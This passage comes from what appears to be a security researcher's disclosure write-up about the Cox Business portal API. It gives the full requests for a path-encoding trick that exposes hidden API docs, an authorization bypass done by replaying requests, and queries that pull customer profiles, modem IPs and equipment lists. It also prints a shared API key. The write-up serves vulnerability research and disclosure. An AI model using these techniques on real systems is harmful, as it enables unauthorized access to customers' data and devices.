/api/cbma/user/identity/services/useridentity/user/contact/validate
...
</code></pre>
<p>There were over 100 different API calls that all had the same base path of <code>/api/cbma/</code>. Since this route seemed to be power most device-related functionality, I thought it was worth investigating if the <code>/api/cbma/</code> endpoint happened to be a reverse proxy to another host. I tested this by sending the following requests:</p>
<h3 id="http-request-that-does-not-start-with-apicbma-returns-301">HTTP request that does not start with api/cbma (returns 301):</h3>
<pre><code><span>GET</span> <span>/api/anything_else/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>301</span> <span>Moved</span> <span>Permanently</span>
<span>Location:</span> <span>https://myaccount-business.cox.com/cbma/api/anything_else/example</span>
</code></pre>
<h3 id="http-request-that-does-start-with-apicbma-returns-500">HTTP request that does start with api/cbma (returns 500):</h3>
<pre><code><span>GET</span> <span>/api/cbma/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>From sending the above HTTP requests, we learn that the <code>api/cbma</code> endpoint is an explicit route that is likely a reverse proxy to another host due to the differing behavior around the HTTP response. When we request anything besides <code>api/cbma</code>, it responds with a 302 redirect instead of the 500 internal server error triggered from <code>api/cbma</code>.</p>
<p>This indicated that they were proxying API requests to a dedicated backend while serving the frontend files from the normal system.</p>
<p>Since the API itself had all of the interesting device management functionality, it made sense to focus on everything behind the <code>api/cbma</code> route and see if there was any low hanging fruit like exposed actuators, API documentation, or any directory traversal vulnerabilities that would allow us to escalate permissions.</p>
<p>I went ahead and proxied the registration request for the Cox Business portal which was underneath the <code>api/cbma</code> path:</p>
<pre><code><span>POST</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:124.0)</span> <span>Gecko/20100101</span> <span>Firefox/124.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
<span>Ma_transaction_id:</span> <span>a85dc5e0-bd9d-4f0d-b4ae-4e284351e4b4</span>
<span>Content-Length:</span> <span>28</span>
<span>Connection:</span> <span>close</span>

{<span>"email"</span><span>:"test@example.com"</span>}
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>126</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"id":</span> <span>"test@example.com"</span>
}
</code></pre>
<p>The HTTP request contained a bunch of different authorization headers including what looked to be a general-use API key that was shared between users. The <code>clientid</code> and <code>Cb_session</code> keys looked very custom and indicated there were multiple roles and permissions used in the application.</p>
<p>The HTTP response looked like a generic Spring response, and we could likely quickly confirm that the backend API was running spring by simply changing the POST to GET and observing the response:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"timestamp":</span> <span>"2024-04-12T08:57:14.384+00:00"</span>,
  <span>"status":</span> <span>500</span>,
  <span>"error":</span> <span>"Internal Server Error"</span>,
  <span>"path":</span> <span>"/services/profile/validate/v1/email"</span>
}
</code></pre>
<p>Yup, that was definitely a Spring error. Since we could confirm that the reverse proxy was running Spring, I decided to look for actuators and exposed API docs.</p>
<p>I went ahead and tried to guess the actuator route:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/actuator/</span>
</code></pre>
<p>Shame, no easy actuators. I then checked for accessible API documentation:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/index.html</span>
<span>✅</span> <span>GET</span> <span>/api/cbma/userauthorization/swagger-ui/index.html</span>
</code></pre>
<p>We had a hit! There was a swagger landing page at <code>/api/cbma/profile/swagger-ui/index.html</code>. I loaded the page expecting to see API routes, however...</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FJEAdxo3.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Totally empty. Something was causing the page not to load. I checked the network traffic and there seemed to be in an infinite redirect loop when attempting to load any static resource:</p>
<pre><code><span>GET</span> <span>/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
<span>...</span>
<span>GET</span> <span>/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js</span> <span>HTTP/1.1</span>
<span>Location:</span> <span>/cbma/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js</span>
</code></pre>
<p>It seemed that requests to load static resources for the page (<code>.png</code>, <code>.js</code>, <code>.css</code>) were all being routed through the base URI instead of the reverse proxy API host. What this meant was there was probably a proxy rule for static assets, so I changed the extension to test this:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.anythingElse</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>After confirming that the <code>.js</code> extension was triggering the routing of the request to the original host, we now needed to find a way to load the resource from the API reverse proxy but without hitting the rule condition which switched routing for static files. The simplest way to do this, since the request was being proxied, was to check if there was any character that we could add which would “drop off” in transit.</p>
<h3 id="loading-static-resources-from-reverse-proxy-api">Loading Static Resources from Reverse Proxy API</h3>
<p>To fuzz this, I simply used Burp’s intruder to enumerate from <code>%00</code> to <code>%FF</code> at the end of the URL. After about 30 seconds of running, we had a 200 OK by appending the URL encoded <code>/</code> symbol:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP</span>/<span>2</span> <span>200</span> <span>OK</span>
<span>Content</span>-<span>Type</span>: application/javascript

<span>window</span>.<span>onload</span> = <span>function</span>(<span></span>) { <span>window</span>.<span>ui</span> = <span>SwaggerUIBundle</span>({ <span>url</span>: <span>"https://petstore.swagger.io/v2/swagger.json"</span>, <span>dom_id</span>: <span>'#swagger-ui'</span>, <span>deepLinking</span>: <span>true</span>, <span>presets</span>: [ <span>SwaggerUIBundle</span>.<span>presets</span>.<span>apis</span>, <span>SwaggerUIStandalonePreset</span> ], <span>plugins</span>: [ <span>SwaggerUIBundle</span>.<span>plugins</span>.<span>DownloadUrl</span> ], <span>layout</span>: <span>"StandaloneLayout"</span> , <span>"configUrl"</span> : <span>"/services/v3/api-docs/swagger-config"</span>, <span>"validatorUrl"</span> : <span>""</span> }); <span>//&lt;/editor-fold&gt; };</span>
</code></pre>
<p>By appending the <code>%2f</code> to the <code>.js</code> extension, we could load the JS files. I wrote a rule to append <code>%2f</code> to all static resources using Burp’s match-and-replace then reloaded the page.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fm332NDr.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Perfect, the swagger routes had loaded. I used the same trick to load all the swagger docs on all of the other API endpoints. In total, there were about 700 different API calls with each API having the following number of calls:</p>
<pre><code>account (115 routes)
voiceutilities (73 routes)
user (70 routes)
datainternetgateway (57 routes)
accountequipment (55 routes)
billing (53 routes)
ticket (52 routes)
profile (47 routes)
voicecallmanagement (46 routes)
voicemail (37 routes)
voiceusermanagement (30 routes)
userauthorization (24 routes)
csr (16 routes)
voiceprofile (14 routes)
</code></pre>
<p>After quickly skimming through everything, the following APIs appeared to have the most functionality for interacting with hardware and accessing customer accounts:</p>
<pre><code>accountequipment (55 routes)
datainternetgateway (57 routes)
account (115 routes)
</code></pre>
<p>Copying the HTTP request that I’d used to register to the website, I ran an intruder script to hit every single GET endpoint to check if there were any accessible unauthenticated API endpoints. What came back was really interesting. There was a 50/50 split of endpoints which gave an authorization error or 200 OK HTTP response.</p>

<p>After the intruder scan of all of the API endpoints completed, I scrolled through to see if any had any interesting responses. The following "profilesearch" endpoint had an interesting HTTP response which appeared to be returning a blank JSON object from what looked to be an empty search:</p>
<pre><code><span>GET</span> <span>/api/cbma/profile/services/profile/profilesearch/</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"profile":</span> {
    <span>"numberofRecords":</span> <span>"0 hits"</span>,
    <span>"searchList":</span> []
  }
}
</code></pre>
<p>From looking at the JavaScript, it seemed that we’d need to add an argument to the URI for a profile to search for. I went ahead and typed in <code>test</code> into the URI and got the following response:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Authorization Error-Invalid User Token"</span>
<span>}</span>
</code></pre>
<p>Invalid user token? But I’d just been able to hit this endpoint? I removed the word <code>test</code> from the URI and resent this request. Another authorization error! For some reason, the original endpoint without parameters was now returning an authorization error even though we could just hit it when running intruder.</p>
<p>I did a sanity check and confirmed that nothing had changed between the request in intruder and my repeater request. I replayed the request one more time, but surprisingly this time it gave me the original 200 OK and the JSON response from intruder! What was going on? It seemed to be intermittently giving me authorization errors or saying that the request had been successful.</p>
<p>To test if I could reproduce this with an actual search query, I wrote down <code>cox</code> in the URI and replayed the request 2-3 more times until I saw the following response:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span><span>,</span>
  <span>"profile"</span><span>:</span> <span>{</span>
    <span>"numberofRecords"</span><span>:</span> <span>"10000+ hits"</span><span>,</span>
    <span>"searchList"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"COX REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"cbbccdae-b1ab-4e8c-9cec-e20c425205a1"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"Cox Communications SIP Trunk REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"bc2a49c7-0c3f-4cab-9133-de7993cb1c7d"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"cox test account ds1/REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"74551032-e703-46a2-a252-dc75d6daeedc"</span>
      <span>}</span>
    <span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<p>Woah! These looked like profiles of Cox business customers. Not really expecting results, I replaced the word "cox" with "fbi" to see if it was actually pulling customer data:</p>
<pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span><span>,</span>
  <span>"profile"</span><span>:</span> <span>{</span>
    <span>"numberofRecords"</span><span>:</span> <span>"REDACTED hits"</span><span>,</span>
    <span>"searchList"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"7b9f092a-e938-41d5-bcf5-0be1bb6487f5"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"c8923f6f-b4ed-4f66-a743-000a961edb35"</span>
      <span>}</span><span>,</span>
      <span>{</span>
        <span>"value"</span><span>:</span> <span>"FBI REDACTED"</span><span>,</span>
        <span>"profileGuid"</span><span>:</span> <span>"a32b8112-48ac-4a4f-8893-5ca1c392a31d"</span>
      <span>}</span>
    <span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<p>Oh, no. The above response contained the physical addresses of several FBI field offices who were Cox business customers. The administrative customer search API request was working. Not good!</p>
<p>We had confirmed that we could bypass authorization for the API endpoints by simply replaying the HTTP request multiple times, and there were over 700 other API requests that we could hit. It was time to see what the real impact was.</p>
<h3 id="confirming-we-can-access-anyones-equipment">Confirming We Can Access Anyone's Equipment</h3>
<p>I looked back at the results of the intruder scan, now knowing that I could bypass authorization by simply replaying a request. In order to figure out if this vulnerability could've been used to hack my modem, I needed to know if this API had access to the residential network at an access control level. Cox offered both residential and business services, but under the hood, I was guessing that the underlying API had access to both.</p>
<p>I went ahead and pulled out the simplest looking request that took in a <code>macAddress</code> parameter to test if I could access my own modem via the API.</p>
<pre><code>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=:mac
</code></pre>
<p>This was a GET request to retrieve a modem IP address that required a <code>macAddress</code> parameter. I logged into Cox, retrieved my own MAC address, then sent the HTTP request over-and-over until it returned 200 OK:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/ipAddress?macAddress=f80c58bbcb90</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"ipv4":</span> <span>"98.165.155.8"</span>
}
</code></pre>
<p>It worked! We were accessing our own device through the Cox Business website API! This meant that whatever was running on this could actually be used to talk to the devices. Cox provided service to millions of customers, and this API seemingly allowed me to directly communicate via MAC address with anyone's device.</p>
<p>The next question I had was whether or not we could retrieve the MAC addresses of the hardware connected to someone's account via searching their account ID (which we had retrieved previously through the customer query endpoint). I found the <code>accountequipment/services/accountequipment/v1/equipments</code> endpoint in my swagger list and threw it in my Burp Repeater with my own account ID. It returned the following information:</p>
<pre><code><span>GET</span> <span>/api/cbma/accountequipment/services/accountequipment/v1/equipments/435008132203</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"accountEquipmentList":</span> [
    {
      <span>"equipmentCategory":</span> <span>"Internet"</span>,
      <span>"equipmentModelMake":</span> <span>"NOKIA G-010G-A"</span>,
      <span>"equipmentName":</span> <span>"NOKIA G-010G-A"</span>,
      <span>"equipmentType":</span> <span>"Nokia ONT"</span>,
      <span>"itemModelMake":</span> <span>"NOKIA"</span>,
      <span>"itemModelNumber":</span> <span>"G-010G-A"</span>,
      <span>"itemNumber":</span> <span>"DAL10GB"</span>,
      <span>"macAddress":</span> <span>"f8:0c:58:bb:cb:92"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"F80C58BBCB92"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"ONT_ALU"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20220121"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Data"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"ALCLEB313C84"</span>
    },
    {
      <span>"equipmentCategory":</span> <span>"Voice"</span>,
      <span>"equipmentModelMake":</span> <span>"CISCO DPQ3212"</span>,
      <span>"equipmentName":</span> <span>"CISCO DPQ3212"</span>,
      <span>"equipmentType":</span> <span>"Cable Modem"</span>,
      <span>"itemModelMake":</span> <span>"CISCO"</span>,
      <span>"itemModelNumber":</span> <span>"DPQ3212"</span>,
      <span>"itemNumber":</span> <span>"DSA321N"</span>,
      <span>"macAddress":</span> <span>"e4:48:c7:0d:9a:71"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"E448C70D9A71"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"DATA_D3"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20111229"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Unknown"</span>
        },
        {
          <span>"address":</span> <span>"E448C70D9A75"</span>,
          <span>"portNumber":</span> <span>"2"</span>,
          <span>"portType":</span> <span>"TELEPHONY"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20111229"</span>,
          <span>"serviceCategoryCode":</span> <span>"T"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Telephone"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"240880144"</span>
    },
    {
      <span>"equipmentCategory":</span> <span>"Television"</span>,
      <span>"equipmentModelMake":</span> <span>"Cox Business TV (Contour 1)"</span>,
      <span>"equipmentName":</span> <span>"Cox Business TV (Contour 1)"</span>,
      <span>"equipmentType":</span> <span>"Cable Receiver"</span>,
      <span>"itemModelMake":</span> <span>"CISCO"</span>,
      <span>"itemModelNumber":</span> <span>"650"</span>,
      <span>"itemNumber":</span> <span>"GSX9865"</span>,
      <span>"macAddress":</span> <span>"50:39:55:da:93:05"</span>,
      <span>"portList":</span> [
        {
          <span>"address":</span> <span>"44E08EBB6DBC"</span>,
          <span>"portNumber":</span> <span>"1"</span>,
          <span>"portType":</span> <span>"CHDDVRX1"</span>,
          <span>"qualityAssuranceDate":</span> <span>"20131108"</span>,
          <span>"serviceCategoryDescription":</span> <span>"Cable"</span>
        }
      ],
      <span>"serialNumber":</span> <span>"SACDRVKQN"</span>
    }
  ]
}
</code></pre>
<p>It worked! My connected equipment was returned in the HTTP response.</p>
<h3 id="accessing-and-updating-any-cox-business-customer-account">Accessing and Updating any Cox Business Customer Account</h3>
<p>To test if this could be abused to access and modify business customer accounts, I found an API request which could query customers via email. I sent the following HTTP request and saw the following response:</p>
<pre><code><span>GET</span> <span>/api/cbma/user/services/user/admin@cox.net</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"id":</span> <span>"admin@cox.net"</span>,
  <span>"guid":</span> <span>"89d6db21-402d-4a57-a87b-cad85d01b192"</span>,
  <span>"email":</span> <span>"admin@cox.net"</span>,
  <span>"firstName":</span> <span>"Redacted"</span>,
  <span>"lastName":</span> <span>"Redacted"</span>,
  <span>"primaryPhone":</span> <span>"Redacted"</span>,
  <span>"status":</span> <span>"INACTIVE"</span>,
  <span>"type":</span> <span>"RETAIL"</span>,
  <span>"profileAdmin":</span> <span>true</span>,
  <span>"profileOwner":</span> <span>true</span>,
  <span>"isCpniSetupRequired":</span> <span>false</span>,
  <span>"isPasswordChangeRequired":</span> <span>true</span>,
  <span>"timeZone":</span> <span>"EST"</span>,
  <span>"userType":</span> <span>"PROFILE_OWNER"</span>,
  <span>"userProfileDetails":</span> {
    <span>"id":</span> <span>"{3DES}JA1+doxmDYc="</span>,
    <span>"guid":</span> <span>"9795bd4c-92d6-4aa2-ad30-1da4bbcbe1da"</span>,
    <span>"name":</span> <span>"Supreme Carpet Care"</span>,
    <span>"status":</span> <span>"ACTIVE"</span>,
    <span>"ownerEmail":</span> <span>"admin@cox.net"</span>
  },
  <span>"contactType":</span> {
    <span>"contactInfo":</span> [
      {
        <span>"type":</span> <span>"alternateEmail"</span>,
        <span>"value":</span> <span>"redacted@redacted.com"</span>
      }
    ]
  },
  <span>"preferredEmail":</span> <span>"admin@cox.net"</span>
}
</code></pre>
<p>Another similar POST account update request worked. This confirmed we could read and write to business accounts.</p>
<p>At this point, I'd demonstrated that it was possible to (1) search a customer and retrieve their business account PII using only their name, then (2) retrieve the MAC addresses of the connected hardware on their account, then (3) run commands against the MAC address via the API. It was time to find some API endpoints that actually wrote to the device to simulate an attacker attempting to get code execution.</p>
<h3 id="overwriting-anyones-device-settings-via-leaked-cryptographic-secret">Overwriting Anyone's Device Settings via Leaked Cryptographic Secret</h3>
<p>Looking through the swagger docs, it seemed that every hardware modification requests (e.g. update device password) required a parameter called <code>encryptedValue</code>. If I could find a way to generate this value, then I could demonstrate write access to modems which would lead to remote code execution.</p>
<p>To know if I could even generate this <code>encryptedValue</code> parameter, I had to dig through the original JavaScript to figure out exactly how it was being signed.</p>
<figure><img alt="JS" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FfHIm82Z.png&amp;w=3840&amp;q=75"><figcaption>JS</figcaption></figure>
<p>After tracing the <code>encryptedValue</code> parameter back through the JavaScript, I landed on these two functions:</p>
<pre><code><span>encryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> k = n.<span>AES</span>.<span>encrypt</span>(D, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>ciphertext</span>.<span>toString</span>(n.<span>enc</span>.<span>Base64</span>);
    <span>return</span> <span>btoa</span>(s.<span>IV</span> + <span>"::"</span> + s.<span>qs</span> + <span>"::"</span> + k)
}
</code></pre>
<pre><code><span>decryptWithSaltandPadding</span>(<span>D</span>) {
    <span>const</span> W = <span>atob</span>(D),
        k = <span>this</span>.<span>sanitize</span>(W.<span>split</span>(<span>"::"</span>)[<span>2</span>]),
        M = n.<span>lib</span>.<span>CipherParams</span>.<span>create</span>({
            <span>ciphertext</span>: n.<span>enc</span>.<span>Base64</span>.<span>parse</span>(k)
        });
    <span>return</span> n.<span>AES</span>.<span>decrypt</span>(M, <span>this</span>.<span>getKey</span>(), {
        <span>iv</span>: n.<span>enc</span>.<span>Hex</span>.<span>parse</span>(s.<span>IV</span>)
    }).<span>toString</span>(n.<span>enc</span>.<span>Utf8</span>)
}
</code></pre>
<p>Both of these functions took in variables which only existed at runtime, so the easiest way to actually call these functions would be to find somewhere it was called within the actual UI. After searching for a little while, I’d realized that the 4-digit PIN that I set when registering my account was encrypted using the same function!</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FUvElxtP.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>I set a breakpoint at exactly where the <code>encryptWithSaltAndPadding</code> function was called, then hit enter.</p>
